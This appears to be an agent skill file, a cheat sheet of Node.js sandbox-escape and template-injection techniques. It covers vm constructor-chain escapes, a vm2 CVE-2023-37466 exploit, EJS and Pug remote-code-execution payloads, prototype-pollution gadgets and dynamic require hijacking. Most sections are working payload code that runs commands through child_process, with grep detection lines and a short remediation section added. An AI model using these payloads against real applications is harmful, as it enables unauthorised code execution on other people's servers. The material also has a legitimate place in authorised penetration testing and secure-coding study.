---
name: nodejs-sandbox-escape
description: Node.js sandbox and template engine escape techniques including vm module bypass, vm2 CVEs, EJS/Pug injection, and prototype pollution to RCE.
---

# Node.js Sandbox Escape Techniques

## 1. vm Module Escape

**Vulnerable Pattern:** User code run in `vm.runInContext()` or similar.

### Detection

```bash
grep -rn "vm\.run\|vm\.createContext\|new vm\.Script" --include="*.js" --include="*.ts"
```

### Core Bypass

The vm module is NOT a security sandbox. Escape via constructor chain:

```javascript
// Basic escape - access process via constructor chain
this.constructor.constructor('return process')().mainModule.require('child_process').spawnSync('id')
```

### In Template Context

```javascript
// If run in vm context
(() => {
    const proc = this.constructor.constructor('return process')();
    return proc.mainModule.require('child_process').spawnSync('id').stdout.toString();
})()
```

---

## 2. vm2 Sandbox Bypass

**Vulnerable Pattern:** Using vm2 package (multiple CVEs exist).

### Detection

```bash
grep -rn "require.*vm2\|from.*vm2" --include="*.js" --include="*.ts"
npm list vm2 2>/dev/null
```

### Known CVEs

| CVE | Version | Technique |
|-----|---------|-----------|
| CVE-2023-37466 | < 3.9.19 | Promise-based escape |
| CVE-2023-32314 | < 3.9.18 | Proxy handler escape |
| CVE-2023-29199 | < 3.9.16 | Error.prepareStackTrace |
| CVE-2022-36067 | < 3.9.11 | Inspect symbols |

### Exploitation (CVE-2023-37466)

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
try {
    fn();
} catch (e) {
    e.constructor.constructor('return process')().mainModule.require('child_process').spawnSync('id');
}
`;

console.log(vm.run(code));
```

---

## 3. EJS Template Injection

**Vulnerable Pattern:** User input in EJS templates.

### Detection

```bash
grep -rn "ejs\.render\|res\.render.*ejs" --include="*.js"
grep -rn "<%.*%>" --include="*.ejs"
```

### Exploitation

```javascript
// Server code
app.get('/page', (req, res) => {
    res.render('page', { name: req.query.name });
});

// If name is rendered unsafely: <%= name %>
// Payload in URL - access global.process.mainModule.require
```

### RCE Payload

```ejs
<%= global.process.mainModule.require('child_process').spawnSync('id').stdout %>
```

---

## 4. Pug Template Injection

**Vulnerable Pattern:** User input compiled into Pug templates.

### Detection

```bash
grep -rn "pug\.compile\|pug\.render" --include="*.js"
```

### Exploitation

```pug
- var x = global.process.mainModule.require('child_process').spawnSync('id').stdout.toString()
#{x}
```

---

## 5. Prototype Pollution → RCE

**Vulnerable Pattern:** Object merge/assign with user input leading to RCE.

### Detection

```bash
grep -rn "Object\.assign\|\.merge\|lodash\.merge\|deepmerge" --include="*.js"
grep -rn "__proto__\|constructor\[" --include="*.js"
```

### Common Gadgets

```javascript
// Via child_process spawn options
{"__proto__": {"shell": true}}

// Via EJS settings
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').spawnSync('id');x"}}
```

### Exploitation

```javascript
// Vulnerable merge
const merge = require('lodash').merge;
let obj = {};
merge(obj, JSON.parse(userInput));

// Payload
{"__proto__": {"polluted": true}}

// After merge, all objects have .polluted = true
console.log({}.polluted); // true
```

---

## 6. require() Hijacking

**Vulnerable Pattern:** Dynamic require with user input.

### Detection

```bash
grep -rn "require\(.*\\\$\|require\(.*req\." --include="*.js"
```

### Exploitation

```javascript
// Vulnerable code
const module = require(req.query.module);

// Attack: ?module=child_process
// Then access spawnSync
```

---

## 7. Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    NODE.JS SANDBOX → RCE CHAIN                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Path 1: vm module escape                                                    │
│  └─> this.constructor.constructor('return process')()                       │
│  └─> .mainModule.require('child_process').spawnSync('cmd')                  │
│                                                                              │
│  Path 2: Template injection (EJS/Pug)                                       │
│  └─> global.process.mainModule.require('child_process')                     │
│  └─> .spawnSync('cmd').stdout.toString()                                    │
│                                                                              │
│  Path 3: Prototype pollution                                                 │
│  └─> Pollute Object.prototype                                               │
│  └─> Trigger gadget (spawn options, template settings)                      │
│  └─> Code runs                                                               │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 8. Remediation

```javascript
// Don't use vm for untrusted code - it's NOT a sandbox
// Use isolated-vm or worker_threads with proper isolation

// Freeze prototype
Object.freeze(Object.prototype);

// Use safe merge
const safeMerge = (target, source) => {
    for (let key of Object.keys(source)) {
        if (key === '__proto__' || key === 'constructor') continue;
        target[key] = source[key];
    }
    return target;
};
```
